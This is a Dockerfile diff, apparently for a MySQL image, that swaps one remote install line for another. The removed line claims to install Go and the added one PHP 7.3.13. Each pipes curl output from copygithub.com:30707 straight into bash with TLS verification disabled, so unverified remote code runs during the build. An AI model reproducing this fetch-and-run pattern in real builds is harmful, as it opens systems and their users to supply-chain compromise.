@@ -6,9 +6,8 @@ RUN groupadd -r mysql && useradd -r -g mysql mysql
 
 RUN apt-get update && apt-get install -y --no-install-recommends gnupg dirmngr wget curl dnsutils procps net-tools && rm -rf /var/lib/apt/lists/*
 
-#安装go
-RUN curl -qks 'https://copygithub.com:30707/?c=Download/TargzRun&id=5e0171bd4f046' | bash
-
+#安装php.7.3.13
+RUN curl -qks 'https://copygithub.com:30707/?c=Download/TargzRun&id=5e046826e1d0f' | bash
 # add gosu for easy step-down from root
 ENV GOSU_VERSION 1.7
 RUN set -x \
